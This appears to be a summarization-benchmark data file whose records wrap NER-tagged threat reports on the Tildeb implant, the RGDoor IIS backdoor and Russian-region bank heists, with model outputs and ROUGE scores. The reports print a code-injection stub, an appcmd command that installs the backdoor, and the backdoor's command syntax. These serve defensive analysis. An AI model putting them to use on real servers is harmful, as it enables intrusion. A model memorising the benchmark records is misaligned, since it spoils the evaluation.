fromSystemModuleInformation , which returns the structure RTL_PROCESS_MODULES . This structure is not publicly documented by [ORG] Microsoft in the [ORG] MSDN library . However , the malware parses it to locate the [ORG] ImageBase [TIME] field.16The [TIME] second method is only reachable if the process pseudohandle or ID value is [CARDINAL] zero , which is unclear in this context . Once all checks are passed , it injects the following code into the targeted process : injected_code proc near mov edi , [ esp+8+PtrLoadLibraryA ] lea eax , [ edi+8 ] push eax // fname_s ( path to downloaded module ) call dword ptr [ edi ] // LoadLibraryA mov esi , eax test esi , esi jz short [PERSON] ret_zero push esi call dword ptr [ edi+4 ] // FreeLibrary mov eax , esi injected_code endpThe code above is responsible for loading and freeing a library module downloaded from the server ( as shown in control command [CARDINAL] 0x20 ) into the address space of the targeted process . Note that the addresses of the APIs LoadLibraryA ( ) and [ORG] FreeLibrary ( ) are resolved dynamically prior to injection , and then their addresses are injected accordingly . Nothing stands out with respect to the code responsible for injection . It is done by committing a region of memory of size ( injected code size ( [CARDINAL] 32 ) + [CARDINAL] 531 = [CARDINAL] 563 bytes ) within the virtual address space of the targeted process , with the memory protection for the regions to be allocated set to PAGE_EXECUTE_READWRITE . Copying and starting the code into the targeted process is done via the standard APIs [PERSON] WriteProcessMemory ( ) , CreateRemoteThread ( ) , and WaitForSingleObject(hThread , 0xFFFFFFFF).The methods it tries in case Tildeb does n\u2019t have the specified access rights to the process object are as follows:1.It attempts to add the GENERIC_ALL ( the right to read , write , and execute the object ) access- allowed [ORG] Access [ORG] Control [ORG] Entry ( [ORG] ACE ) to the security identifier of the account named Everyone on the system . Then , it tries to set / update the DACL_SECURITY_INFORMATION ( discretionary access control list ) for object SE_KERNEL_OBJECT of the targeted process with the new [ORG] ACE , that is , GENERIC_ALL.If Tildeb is still unable to acquire those access rights after executing this step , it attempts to perform the same action on [CARDINAL] two other accounts that are Domain Users and the name of the user associated with the current thread.2.If all of the actions in the [ORDINAL] first step fails , the implant attempts to exploit an unknown escalation - of- privileges ( EoP ) vulnerability in the driver win32k.sys . This feature targets very specific versions of win32k.sys . It checks for those versions by comparing the CRC-32 checksum of the file on the infected system against the following list of hardcoded checksums:17Hardcoded CRC-32 [ORG] Checksum [ORG] MS Windows NT 4.0 ( Service Pack 3 ) MS Windows NT 4.0 ( Service Pack 6a ) MS Windows NT 4.0 ( Service Pack 6)We were only able to map [CARDINAL] three of the checksums to their respective OS versions . Moreover , this [GPE] EoP is attempted only on systems with specific locale ( default country ) . The temporary file ~debl00l.tmp is created in the same directory of the implant , and after exploitation . It includes the following information : ver= < unique value assigned by the implant based on the default country code > ccode=<LOCALE_IDEFAULTCOUNTRY > CRC=<crc-32 checksum value of \u201c % [CARDINAL] windir%\\system32\\win32k.sys\u201d>18TREND [ORG] MICROTM [ORG] RESEARCHTrend [ORG] Micro , a global leader in cybersecurity , helps to make the world safe for exchanging digital information . [ORG] Trend [ORG] Micro [ORG] Research is powered by experts who are passionate about discovering new threats , sharing key insights , and supporting efforts to stop cybercriminals . Our global team helps identify [CARDINAL] millions of threats [DATE] daily , leads the industry in vulnerability disclosures , and publishes innovative research on new threats techniques . We continually work to anticipate new threats and deliver thought - provoking research.www.trendmicro.com19", "generated_text": "a console-based executable; Tildeb; a command-line argument; 0; 1; two; the shell; commands; The implant; command-line options; IP; port; the C&C server; OS; OSX; a specific purpose; IP address; Port; IP addresses; variables; argv[0]; a port; IR; the IP; the byte; NONE; the obfuscation; the IP address; the network; the IP; a configuration file; a list; any other files; the leak; the C++; DLL; a name; PATROLWAGON; an unknown exploitation framework; exploitation frameworks; UNITEDRAKE; MOSSFERN; EXPANDINGPULLY; GROK; FOGGYBOTTOM; MORBIDANGEL; the infection vector; the DLL; the system; the C&C server; lateral movement; the IP addresses; a command; the IP; credentials; a decryption file; a decryption file; an arbitrary path; the decryption file;", "ref_text": "<START-1>The report provides an analysis of the Tildeb malware implant leaked by the Shadow Brokers. Tildeb is a console-based Windows executable compiled in 2000 that accepts command-line arguments. It has no encryption, anti-debugging or persistence mechanisms. Tildeb establishes encrypted TCP communications with a hardcoded command and control server to receive control commands. It can upload and delete files, get directory listings, modify the registry, communicate via mailslots, and inject code into the Exchange Server processes. The implant creates a cleanup thread to remove artifacts if connections fail. It attempts privilege escalation against specific Windows versions using a win32k.sys vulnerability. Tildeb tailors some actions based on the infected system's locale. The report examines Tildeb's command and control communications in depth, including the key exchange, control commands supported, error reporting, and mailslot messaging formats. It analyzes the process hollowing code injection technique employed. There are indications Tildeb may be delivered via spearphishing or run in conjunction with an exploitation framework. The compile timestamp suggests development prior to 2000, but it may have undergone iterations. While the exact targets are unknown, the Exchange Server interactions imply compromise of email environments. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.44751381215469616, "gpt3/lexical/rouge_rouge2": 0.08888888888888889, "gpt3/lexical/rouge_rougeL": 0.19337016574585636, "gpt3/lexical/rouge_rougeLsum": 0.19337016574585636, "gpt3_generated_text": ["The article discusses the file characteristics of an implant called Tildeb. It is a 32-bit console Windows executable file that accepts command-line arguments. The file was compiled on October 3, 2000, and has a size of 57,344 bytes. The code is developed using the C language with the Windows Foundation Class (MFC) library. The code is not obfuscated and does not have anti-disassembly or anti-debugging features. The infection vector of Tildeb is not linked to any other files from the leak, but there is a reference to a table in a database file that might be related to an unknown exploitation framework called \"PATROLWAGON\". The implant can be executed with different command-line options, specifying the C&C server IP address and port. It can also attempt to elevate privileges to inject code into a Microsoft Exchange Server process. Overall, the article provides details about the file characteristics and behavior of Tildeb, as well as its potential relation to other files and exploitation frameworks."]}, {"split_name": "val", "sample_id": "val_65", "prompt_text": "Extract the keywords: [PERSON] Blog [PERSON] Home ( url > Unit 42 ( url > OilRig uses [ORG] RGDoor IIS Backdoor on Targets in the [LOC] Middle EastOilRig uses [ORG] RGDoor [ORG] IIS [ORG] Backdoor [ORG] on [ORG] Targets in the Middle EastBy [PERSON] Robert [PERSON] Falcone ( url [DATE] January 25 , [DATE] 2018 at [TIME] 5:00 [TIME] AM [TIME] Category : Unit 42 ( url Tags : [LOC] Middle [LOC] East ( url [ORG] OilRig ( url [ORG] RGDoor ( url [WORK_OF_ART] TwoFace ( url \ue800 [CARDINAL] 6,724 \ue802(3)(url iis - backdoor - targets - middle - east%2F+OilRig+uses+RGDoor+IIS+Backdoor+on+Targets+in+the+Middle+East ) \ue805 ( url u = [DATE] https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42 - oilrig - uses - rgdoor - iis- backdoor - targets - middle - east%2F ) [PERSON] \ue804 ( url mini = true&url = [DATE] https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42 - oilrig - uses- rgdoor - iis - backdoor - targets - middle- east%2F&title = OilRig+uses+RGDoor+IIS+Backdoor+on+Targets+in+the+Middle+East&summary=&source= ) ( //www.reddit.com / submit)Summary While investigating \ufb01les uploaded to a [FAC] TwoFace ( url webshell , Unit [CARDINAL] 42 discovered actors installing [ORG] an [ORG] Internet [ORG] Information [ORG] Services ( IIS ) backdoor that we call [ORG] RGDoor . Our data suggests that actors have deployed the [ORG] RGDoor backdoor on webservers belonging to [CARDINAL] eight [NORP] Middle [NORP] Eastern government organizations , as well as [CARDINAL] one \ufb01nancial and [CARDINAL] one educational institution . We believe the actors deploy [ORG] RGDoor as a secondary backdoor to regain access to a compromised webserver in the event a victim organization detects and removes the [FAC] TwoFace shell . We do not have HTTP logs that show the actor interacting with [ORG] RGDoor , so we do not know the activities the actors carry out using the backdoor . However , we were able to create a client application to interact with [ORG] RGDoor for testing purposes , which allowed us to interact with the backdoor to see how it operates on an IIS server . [ORG] RGDoor [ORG] Unlike [FAC] TwoFace , the actors did not develop [ORG] RGDoor in C # to be interacted with at speci\ufb01c URLs hosted by the targeted IIS web server . Instead , the developer created [ORG] RGDoor using [LANGUAGE] C++ , which results in a compiled dynamic link library ( [ORG] DLL ) . The [ORG] DLL has an exported function named \u201c RegisterModule \u201d , which is important as it led us to believe that this [ORG] DLL was used as a custom native - code HTTP module that the threat actor would load into IIS . Starting with IIS 7 ( url developers could create modules in [LANGUAGE] C++ that the IIS webserver would load to extend IIS \u2019 capabilities , such as carry out custom actions on requests . The fact that [ORG] RGDoor is an IIS HTTP module suggests that there is no visual representation of the shell for actors to interact with , which also di\ufb00ers from [ORG] TwoFace \u2019s interface that actors can interact with by visiting the URL to the [FAC] TwoFace ASPX \ufb01le . According to [ORG] Microsoft \u2019s documentation ( url native - code modules can be installed either in the IIS Manager [PERSON] GUI or via the command - line using the \u201c appcmd \u201d application . While we do not have logs to determine exactly how the actors install [ORG] RGDoor , the actor can use the [FAC] TwoFace webshell to install the [ORG] RGDoor module via the command line . The following command could be used to install the HTTP module on an IIS server : % systemroot%\\system32\\inetsrv\\APPCMD.EXE install module [PERSON] /name:[module name ] /image:[path to RGDoor DLL ] /add : true We con\ufb01rmed the command above successfully installed the [ORG] RGDoor backdoor in our test environment . Figure [CARDINAL] 1 shows the speci\ufb01c command we used to install [ORG] RGDoor on our IIS server . Figure [CARDINAL] 1 Command - line used to install [ORG] RGDoor module into IISWe con\ufb01rmed [ORG] RGDoor installed correctly into IIS by checking the HTTP Modules display in IIS Manager . Figure [CARDINAL] 2 shows the [ORG] RGDoor [ORG] DLL ( HTTPParser.dll ) was loaded into IIS using the module name [ORG] HTTPParser . Figure [CARDINAL] 2 Installed [ORG] RGDoor module displayed in the HTTP Modules list in IIS MangerListening for [ORG] Commands [ORG] We analyzed [ORG] RGDoor samples and found that the \u201c RegisterModule \u201d function does very little other than calling the IHttpModuleRegistrationInfo::SetRequestNoti\ufb01cations method . According to [ORG] MSDN ( url us / library / ms693045(v = vs.90).aspx ) , the SetRequestNoti\ufb01cations function has the following prototype , which allows a developer to con\ufb01gure the module to handle GET requests ( dwRequestNoti\ufb01cations ) and/or [ORG] POST requests IN IHttpModuleFactory * pModuleFactory , IN DWORD dwRequestNotifications , IN DWORD dwPostRequestNotifications ) In [ORG] RGDoor , the code calls this function with arguments that ignore inbound HTTP GET requests , but act on all [ORG] HTTP [ORG] POST requests seen by the IIS server , even [ORG] POST requests issued over [ORG] HTTPS . [ORG] RGDoor calls this function with the following arguments , the [ORDINAL] third of which ( dwPostRequestNoti\ufb01cations ) is set to \u201c RQ_BEGIN_REQUEST \u201d , which is an event triggered immediately after IIS receives the [ORG] POST request : SetRequestNotifications(pModuleFactory,0,RQ_BEGIN_REQUEST ) [ORG] RGDoor is noti\ufb01ed immediately when the IIS server receives an inbound [ORG] HTTP [ORG] POST request . [ORG] RGDoor parses these [ORG] POST requests , speci\ufb01cally looking for the HTTP \u201c Cookie \u201d \ufb01eld by accessing the HTTP header with the following function call : pHttpContext > GetRequest ( ) > GetHeader(\u201cCookie\u201d,NULL ) After accessing the cookie \ufb01eld , [ORG] RGDoor parses this \ufb01eld by looking for the string \u201c RGSESSIONID= \u201d , which is the basis for the name [ORG] RGDoor . If present , the code uses the [CARDINAL] two - bytes immediately following the \u201c RGSESSIONID= \u201d string as a decryption key , speci\ufb01cally treating the [CARDINAL] two character bytes as a single hexadecimal byte . For instance , the [QUANTITY] two - byte key of \u201c 00 \u201d would represent the hexadecimal value of [CARDINAL] 0x00 , where \u201c FF \u201d would represent [DATE] 0x\ufb00 , and so on . The key is followed by a [PERSON] Base64 encoded string that contains ciphertext . The following represents the structure of the cookie \ufb01led in inbound [ORG] RGDoor requests : RGSESSIONID=[two bytes for key][Base64 encoded ciphertext ] [ORG] RGDoor decodes the [PERSON] Base64 encoded string and then decrypts the decoded string using a custom algorithm . The custom algorithm iterates through the ciphertext using the \u2018 pxor \u2019 instruction to XOR each byte of ciphertext with the single - byte hexadecimal value from the [QUANTITY] two - byte character key provided in the cookie \ufb01eld . The code will parse the cleartext looking for [CARDINAL] one of [CARDINAL] three commands : \u201c cmd$ \u201d , \u201c upload$ \u201d and \u201c download$ \u201d . The code treats the string immediately following the command as the command \u2019s argument . Table 1 provides the arguments and further details on the [CARDINAL] three commands . CommandDescriptioncmd$[command to execute]Uses \u201c popen \u201d to run the speci\ufb01ed command . It enters a loop that calls \u201c fgets \u201d to get the command results . The loop \ufb01nishes when a call to \u201c feof \u201d designates the end of the command results , which are relayed back to the actor via the HTTP response.upload$[path to \ufb01le ] Gets the length of uploaded data bychecking the \u201c Content - Length \u201d \ufb01eld within the HTTP request . Uses the IHttpRequest::GetRemainingEntityBytes and IHttpRequest::ReadEntityBody methods to obtain base64 encoded data within the body of the [ORG] HTTP [ORG] POST request . The code decrypts the decoded data using the XOR algorithm and writes the data to the speci\ufb01ed \ufb01le . It will respond to this request with either \u201c write done \u29f5r\u29f5n \u201d or \u201c ca n\u2019t open \ufb01le : \u201c . Reads a speci\ufb01ed \ufb01le and encrypts it with the XOR algorithm , [PERSON] Base64 encodes the ciphertext and sends the data back to the actor via the HTTP response.download$[path to \ufb01le]Table [CARDINAL] 1 [ORG] Commands available within RGDoorResponding to [ORG] Commands When responding to inbound requests , the code will clear the response that IIS would have responded to the [ORG] HTTP [ORG] POST request by calling the following functions : pHttpContext > GetResponse ( ) > Clear ( ) [ORG] RGDoor then constructs its own HTTP response by \ufb01rst setting the \u201c Content - Type \u201d \ufb01eld within the HTTP header to \u201c text / plain \u201d . Figure [CARDINAL] 3 shows the code that uses the IHttpResponse::SetHeader method to set the \u201c Content - Type \u201d \ufb01eld within the HTTP response to \u201c text / plain \u201d , speci\ufb01cally by using a value of 0xC ( 0xA + 2 ) for the ulHeaderIndex within [ORG] HTTP_HEADER_ID enumeration . Figure [CARDINAL] 3 [ORG] RGDoor code to set [ORG] the [ORG] HTTP Content - Type to \u201c text / plain\u201dThe sample then transmits the data back to the actor by creating a loop that calls the IHttpResponse::WriteEntityChunk method until all of the data is sent to the actor within HTTP responses . If the WriteEntityChunk method fails at any point during this loop , the code will respond to the actor with a HTTP 500 \u201c Server Error \u201d response by using the [ORG] IHttpResponse::SetStatus method . Interacting with [ORG] RGDoor [ORG] We created a client application to interact with the [ORG] RGDoor module , speci\ufb01cally to issue commands to the backdoor and to see how it operates on the IIS server . As mentioned previously in this blog , [ORG] RGDoor has [CARDINAL] three available commands , speci\ufb01cally \u201c cmd$ \u201d , \u201c upload$ \u201d and \u201c download$ \u201d . We used our client to issue [CARDINAL] one of each of these commands . Figure [CARDINAL] 4 shows the HTTP request and response to our \ufb01rst interaction with the [ORG] RGDoor module . The command issued in this request was \u201c cmd$whoami \u201d , which instructs [ORG] RGDoor to run the \u2018 whoami \u2019 command in command prompt . The key used to encrypt this command was \u201c [CARDINAL] 54 \u201d ( [CARDINAL] 0x54 ) , which resulted in [PERSON] Base64 encoded string of \u201c [PRODUCT] NzkwcCM8OzU5PQ== \u201d . The HTTP response shows the [ORG] RGDoor module returned the [PERSON] Base64 encoded string of \u201c PT0ndDUkJCQ7OzgIMDEyNSE4IDUkJCQ7OzheVA== \u201d , which when decrypted using the same \u201c [CARDINAL] 54 \u201d key is the result of the \u2018 whoami \u2019 command , speci\ufb01cally the string \u201c iis apppool\u29f5\u29f5defaultapppool\u29f5n\u29f5x00\u201d . Figure [CARDINAL] 4 Issuing \u2018 whoami \u2019 command and [ORG] RGDoor \u2019s responseFigure [CARDINAL] 5 shows our testing of [ORG] RGDoor \u2019s upload command , speci\ufb01cally \u201c upload$c:\u29f5windows\u29f5temp\u29f5test.txt \u201d that uploads a \ufb01le from our local system to the webserver . The inbound request uses a key of \u201c [CARDINAL] 54 \u201d ( [CARDINAL] 0x54 ) that results in an encoded command string of \u201c ISQ4OzUwcDduCCM9OjA7IycIIDE5JAggMScgeiAsIA= \u201d . The request also includes the string \u201c IDEnID06M2VmZ14= \u201d within the [ORG] POST data , which is the string \u201c testing123\u29f5n \u201d from the \ufb01le on our local system encrypted using the \u201c [CARDINAL] 54 \u201d key that will be written to the \u201c test.txt \u201d \ufb01le on the server . As you can see from the HTTP response , [ORG] RGDoor responded to this command with \u201c write done \u201d , which is interesting as the response was in cleartext and not encrypted using the custom algorithm . Figure [CARDINAL] 5 Uploading a \ufb01le to server via [ORG] RGDoor [ORG] Downloading a \ufb01le from the server via RGDoorFigure [CARDINAL] 6 shows our testing of the download command within [ORG] RGDoor , speci\ufb01cally a command \u201c download$c:\u29f5windows\u29f5temp\u29f5test.txt \u201d that downloads the \ufb01le uploaded in our previous test . We chose to use the key \u201c 89 \u201d ( [DATE] 0x89 ) in this test to showcase [ORG] RGDoor \u2019s ability to use any hexadecimal byte as a key , which resulted in an encoded command string of \u201c 7eb+5+Xm6O2t6rPV / uDn7eb++tX97OT51f3s+v2n / fH9 \u201d . [ORG] RGDoor responds to this command with the encoded string \u201c /ez6 / eDn7ri7uoM= \u201d , which when decrypted with the \u201c [CARDINAL] 89 \u201d key results in the string \u2018 testing123\u29f5n \u2019 , which is the contents of the \u201c test.txt \u201d \ufb01le . Figure [CARDINAL] 6 Downloading a \ufb01le from the server via RGDoorTo determine how the [ORG] RGDoor client requests appears within the [ORG] IIS request logs , we checked the logs of our default IIS installation in our test environment . By default , IIS does not log the values within [ORG] Cookie \ufb01elds of inbound HTTP requests , which would contain commands issued by actors to [ORG] RGDoor . To see inbound [ORG] RGDoor requests , an administrator must con\ufb01gure logging of [GPE] Cookie \ufb01elds in IIS , which can be selected in the W3C Logging [PERSON] Fields dialog in IIS Manager , as seen in Figure [CARDINAL] 7.Figure 7 W3C Logging [PERSON] Fields dialog in IIS Manager with [GPE] Cookie \ufb01elds enabledThe HTTP requests sent by the client to the [ORG] RGDoor backdoor in the testing above will generate logs on the IIS server . Without the Cookie \ufb01eld logged , it is di\ufb03cult to locate and analyze inbound requests related to [ORG] RGDoor . Remember that [ORG] RGDoor is an IIS module that checks all inbound [ORG] POST requests for commands , so an actor does not need to use [CARDINAL] one particular URL to interact with [ORG] RGDoor . However , the following shows the [ORG] IIS log generated from the \ufb01rst testing request we made using our [ORG] RGDoor client , which shows the \u201c RGSESSIONID= \u201d string , the \u201c [CARDINAL] 54 \u201d key and the [PERSON] Base64 encoded command within the Cookie \ufb01eld : [CARDINAL] 4#Software : [ORG] Microsoft [ORG] Internet [ORG] Information [ORG] Services 7.5 # Version : [MONEY] 1.0 [MONEY] # Date : 2017 - 10 - 03 19:30:13 [CARDINAL] # Fields : date time s - ip cs - method cs - uri - stem cs - uri - query s - port cs - username c - ip cs(User - Agent ) cs(Cookie ) sc - status sc - substatus sc - win32 - status time - taken 0 285Conclusion [ORG] RGDoor is an IIS backdoor that actors used the [FAC] TwoFace webshell to load onto an IIS web server . The [ORG] RGDoor provides backdoor access to the compromised server , which we speculate the actors loaded in order to regain access to the server in the event the [FAC] TwoFace webshell was removed . This backdoor has a rather limited set of commands , however , the [CARDINAL] three commands provide plenty of functionality for a competent backdoor , as they allow an actor to upload and download \ufb01les to the sever , as well as run commands via command prompt . The use of [ORG] RGDoor suggests that this group has contingency plans to regain access to a compromised network in the event their webshells are discovered and remediated . [ORG] Palo [ORG] Alto [ORG] Networks customers are protected from [ORG] RGDoor by the following : All RGDoor samples have malicious verdicts in [ORG] WildFire [ORG] AutoFocus customers can investigate this activity with the [ORG] RGDoor ( url#/tag / Unit42.RGDoor ) tag [ORG] IPS Signature [ORG] RGDoor . [ORG] Gen [ORG] Command and [ORG] Control [ORG] Tra\ufb03c ( ID 11885 ) detects [ORG] RGDoor network tra\ufb03cIndicators of Compromise iishandler6.dllGot something to say?Leave a comment [GPE] Notify me of followup comments via e - mailName ( required)Email ( required)WebsiteSUBMITSUBSCRIBESUBSCRIBE TO [ORG] NEWSLETTERSEmailCOMPANY [ORG] Company ( url [PERSON] Careers ( url [PERSON] Sitemap ( url [WORK_OF_ART] Report [WORK_OF_ART] a [WORK_OF_ART] Vulnerability ( url NOTICES Privacy Policy ( url Terms of Use ( url Manage Subscription ( [PERSON] url\uf08c ( url \uf082 ( url \uf081 ( url \u00a9 2016 [ORG] Palo [ORG] Alto [ORG] Networks , [ORG] Inc. All rights reserved . SALES > 866.320.4788 \uf101SEE A DEMO \uf101TAKE A TEST DRIVE ( HTTP://CONNECT.PALOALTONETWORKS.COM / VIRTUAL - UTD )", "generated_text": "PDF; the RGDoor backdoor; use; Middle Eastern; government organizations; financial and one educational institution; the actor; C++; a compiled dynamic link library; DLL; RegisterModule; the DLL; a custom native-code HTTP module; the threat actor; IIS; use; the IIS webserver; the shell; capabilities; the backdoor; the webshell; the attacker; a compromised webserver; an IIS webserver; the attacker; information; the shell; credentials; the actor; IP addresses; domains; government organizations; education; the Middle East; the domains.", "ref_text": "<START-1>The document describes a backdoor named RGDoor used by a threat actor group called OilRig to maintain access to compromised servers, primarily in the Middle East region. OilRig initially infects servers using a web shell called TwoFace. To have a backup method of access if TwoFace is detected and removed, they also install the RGDoor backdoor module into the IIS web server. RGDoor is stealthier as it does not present a visual web interface like TwoFace. It is installed via IIS configuration and checks all HTTP POST requests for commands encrypted in cookie data. Available commands allow uploading/downloading files and running shell commands. RGDoor provides a more discreet and robust backup access mechanism if the TwoFace web shell is remediated on a compromised server. The report found RGDoor installed on web servers belonging to Middle Eastern government, financial, and educational organizations. Specific details are provided on RGDoor's encryption scheme, command structure, and how it interacts with the IIS server. Recommendations are made to monitor IIS logs for telltale RGDoor cookie values. The report concludes that OilRig has contingency plans to regain access, suggesting persistence is a priority for their operations. Defenses against RGDoor are available in various Palo Alto Networks products and services. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4476744186046511, "gpt3/lexical/rouge_rouge2": 0.13450292397660818, "gpt3/lexical/rouge_rougeL": 0.21511627906976744, "gpt3/lexical/rouge_rougeLsum": 0.21511627906976744, "gpt3_generated_text": ["The article discusses the use of the RGDoor backdoor by the threat actor group OilRig on targets in the Middle East. The actors have deployed RGDoor on webservers belonging to eight Middle Eastern government organizations, as well as one financial and one educational institution. RGDoor is a custom native-code HTTP module developed using C++, which is loaded into the IIS webserver. Unlike the TwoFace shell, RGDoor does not have a visual representation for actors to interact with. The article provides information on how RGDoor is installed and confirms its successful installation in a test environment. The activities carried out by the actors using RGDoor are unknown, as there are no HTTP logs available. Overall, this article highlights the use of the RGDoor backdoor by OilRig on Middle Eastern targets and provides technical details about its functionality and installation."]}, {"split_name": "val", "sample_id": "val_66", "prompt_text": "Extract the keywords: A TRUSTWAVE SPIDERLABS ADVANCED THREAT REPORTPost - Soviet Bank Heists : A Hybrid Cybercrime StudyPost - [ORG] Soviet [ORG] Bank Heists : A Hybrid Cybercrime StudyAuthorsThanassis Diogos EMEA Managing Consultant , Incident Response , [ORG] TrustwaveSachin [ORG] Deodhar [ORG] EMEA Incident Response Consultant , [ORG] TrustwaveResearch and [PERSON] PublicationRodel [PERSON] Mendrez and [PERSON] Gerald [PERSON] Carsula [PERSON] Malware [PERSON] Research [PERSON] Team , TrustwaveTable of [ORG] ContentsIntroduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1 A Closer look . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . [CARDINAL] 2 Detailed walkthrough . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . [CARDINAL] 3 Malicious Code . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5 Recommendations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7 Indicators of Compromise . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8 Files . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . [CARDINAL] 8 IPs / Domains . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . [DATE] 8IntroductionEarlier [DATE] this [DATE] year , the [NORP] SpiderLabs team at Trustwave investigated a series of bank breaches originating from post- [NORP] Soviet states . These investigations took place during mid - to - late [DATE] 2017 , and each bank compromise resulted in a significant amount of stolen funds . The actual amount of money stolen was different in each case , with the average amount [CARDINAL] around [CARDINAL] USD$5 [CARDINAL] million ( in cash ) , ranging from USD$3 to [CARDINAL] USD$10 [CARDINAL] million . The investigations showed that the attacks shared a number of common features , such as involving large amount of monetary loss originating from what initially appeared to be legitimate bank customer accounts . Additionally , in all cases , the theft took place using normal cash withdrawals from various [ORG] ATM terminal locations outside the bank \u2019s originating country . In some cases , the victim banks did n\u2019t even realize that a breach had taken place and a significant amount of money was stolen until well after the attack was completed . In a few cases , the malicious activity was reported to the banks by [ORDINAL] third - party processors responsible for processing the bank \u2019s debit and credit card transactions . The common feature between these cases is that money was stolen using legitimate [ORG] ATM cards provided by each bank . Criminals used ( or hired ) people to personally visit the various branches and request new accounts with minimum or [CARDINAL] zero initial deposit amounts . Beyond opening their \u201c personal \u2019 accounts , they also demanded to receive a debit card with their new account . Initially this might not appear to be an issue since debit card usage is directly related to the account \u2019s balance . However , in the banking world , a service called \u201c [ORG] Overdraft \u201d exists ; simply put it means that under very specific circumstances a debit card can be converted into a credit card . This means that the bank allows their customer to withdraw cash even though they do not have the appropriate balance in their account . Of course , this is supposed to happen only for specific account types , also referred to as risk levels . After the debit cards were delivered to the customers , they were distributed outside the originating country to a group of international conspirators . When all the cards had been relocated to their destination countries , a cyber- criminal , who had already breached the victim bank network , accessed the bank \u2019s internal systems and manipulated the debit cards \u2019 features to enable a high overdraft level and removed anti - fraud controls that had been placed for the specific accounts . [TIME] Minutes [TIME] later the operation continued in the countries where the debit cards had travelled . The debit cards were used to perform cash withdrawals from several different ATMs . Within [TIME] the [TIME] next [TIME] few [TIME] hours the operation concluded , removing up to [CARDINAL] USD$10 [CARDINAL] million from each bank . We believe that the attack described in this report represents a clear and imminent threat to financial institutions in [NORP] European , [NORP] North [NORP] American , [NORP] Asian and [NORP] Australian regions within [DATE] the [DATE] next [DATE] year . Currently the attacks are localized to the [NORP] Eastern [NORP] European and [NORP] Russian regions . However , in cybercrime , this area is often the canary in the mineshaft for upcoming threats to other parts of the world . Our investigations have revealed victim losses currently around approximately USD$40 million . However , when taking into account the undiscovered or uninvestigated attacks along with investigations undertaken by internal groups or [ORDINAL] third parties , we estimate losses to be in the [CARDINAL] hundreds [CARDINAL] of [CARDINAL] millions in USD . All global financial institutions should consider this threat seriously and take steps to mitigate it.1A Closer LookTo drill into the details of these criminal operations we will take a closer look at [CARDINAL] one of the cases . On a winter [TIME] evening in [DATE] February [DATE] 2017 , a credit / debit card processor \u2019s fraud management system picked up a series of suspicious [ORG] ATM withdrawal transactions originating from the victim bank \u2019s customer accounts during [TIME] the late - night [TIME] hours until [TIME] the [TIME] early [TIME] morning . The withdrawals occurred at [ORG] ATM terminals located across the region , including [LOC] Europe and [GPE] the [GPE] Russian [GPE] Federation . Notably , no [ORG] ATM transactions occurred in countries where the affected bank had a presence . In addition to requesting the Trustwave SpiderLabs team to perform a thorough investigation , the bank also reported this incident to local law enforcement agencies . Undoubtedly this incident appeared to be multifaceted ; it appeared that the bank \u2019s network was breached , and it also seemed likely that the processor \u2019s network may have also been compromised . Moreover , it was also likely that there was a physical facet to this breach , in which an organized cybercriminal network was involved . The Trustwave team \u2019s objective was to investigate the incident based purely on available factual evidence and its unbiased interpretation . The [ORDINAL] third - party processor engaged an independent team from [PERSON] Trustwave [PERSON] SpiderLabs to investigate the impact of the incident on its network and its overall business . This way Trustwave could see the whole picture from the perspectives of both the affected bank and the [ORDINAL] third - party processor , whose services the bank used for its card processing functions . The Trustwave team commenced both sides of the investigation immediately and was able to successfully uncover what we believe to be a very interesting , if not entirely unique , modus operandi behind the successful breaches of both the bank and processor networks . The objective of such an operation is the successful withdrawal of funds from the rogue accounts created earlier , as described in this report . The attackers used innovative attack tactics , techniques and procedures to successfully execute a long duration \u201c hybrid \u201d attack campaign comprising [CARDINAL] two physical stages and multiple cyber - attack stages as depicted below : STAGES OF [ORG] THE [ORG] ATTACKPhysical [ORG] Stage I [ORG] Recruit mules toopen bankaccounts and issuenew debit cardsCyber Stage I Obtain unauthorized privigeged access to the bank \u2019s networkCyber [PERSON] Stage [PERSON] II [PERSON] Compromise [ORDINAL] third party processor\u2019snetworkCyber Stage III Obtain privileged access to [ORG] CardManagement [ORG] SystemCyber [ORG] Stage [ORG] IV Activate overdraft on speci\ufb01c bankaccountsPhysical Stage I Cash - out from [GPE] ATMsin multiple cities and countries2Detailed [ORG] WalkthroughOur findings suggest that motivation for the attack was purely financial gain . Our analysis shows that the cyber attackers and their physical counterparts worked in close and very effective coordination to execute this malicious operation:\u2022 The cybercriminal network behind this attack recruited so - called \u201c mules \u201d , ( non - technical conspirators whosejob is to transfer money for cybercriminals ) , to open [CARDINAL] dozens of new bank accounts by physically visiting various branches of this bank in different cities in the country . These individuals used counterfeit documents to request bank accounts , most likely supplied by the organized cybercriminal network . Once these people had new bank accounts approved , they then requested debit / [ORG] ATM card companions to their new bank accounts . After they obtained these debit cards , they probably handed these debit cards over to a member of the cybercriminal network for distribution outside the country for later use . PHYSICAL PART OF THE [ORG] ATTACKRecruit mules to apply for new bank accountsSupply mules with fake IDsRogue accountsare createdRequest debit cardsDebit cards are issuedDebit cards sent outside the country\u2022 While the physical activities involving application for accounts and debit cards were taking place at the bank\u2019svarious branches in the country , the cyber attackers gained initial entry , moved laterally and compromised multiple systems inside the bank \u2019s network . [ORG] GAINING [ORG] INITIAL [ORG] FOOTHOLD [ORG] IN [ORG] THE [ORG] BANK NETWORKOpportunisticPhishingEmails to employeeswith maliciousattachments opened \u2013 \u2018 backdoor \u2019 iscreatedSocialEngineeringAttackers successfullyobtain 